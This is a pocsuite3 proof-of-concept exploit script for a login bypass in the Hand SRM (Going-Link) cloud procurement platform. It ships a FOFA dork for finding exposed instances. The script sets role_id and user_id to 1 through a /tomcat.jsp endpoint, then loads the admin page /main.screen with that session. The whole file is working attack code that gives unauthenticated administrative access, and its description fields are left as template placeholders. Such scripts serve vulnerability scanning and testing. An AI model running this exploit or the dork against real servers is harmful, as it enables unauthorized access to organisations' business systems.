from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = '汉得SRM登录绕过'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': 'app="汉得SRM云平台(Going-Link)"'}

    def _verify(self):
        result = {}
        admin_request = True
        admin_url = urljoin(self.url, "/main.screen")
        session = requests.session()
        uri = ["/tomcat.jsp?dataName=role_id&dataValue=1", "/tomcat.jsp?dataName=user_id&dataValue=1"]
        for i in uri:
            url = urljoin(self.url, i)
            res = session.get(url)
            if "user_id" in res.text or "role_id" in res.text:
                logger.info(f"{i}访问成功!")
            else:
                print("role_id或user_id访问失败")
                admin_request = False
        if admin_request:
            res = session.get(admin_url, verify=False)
            if res.status_code == 200 and "汉得SRM云平台(Going-Link)" in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']["url"] = self.url
                return self.parse_output(result)

    def _attack(self):
        return self._verify()


register_poc(POC)
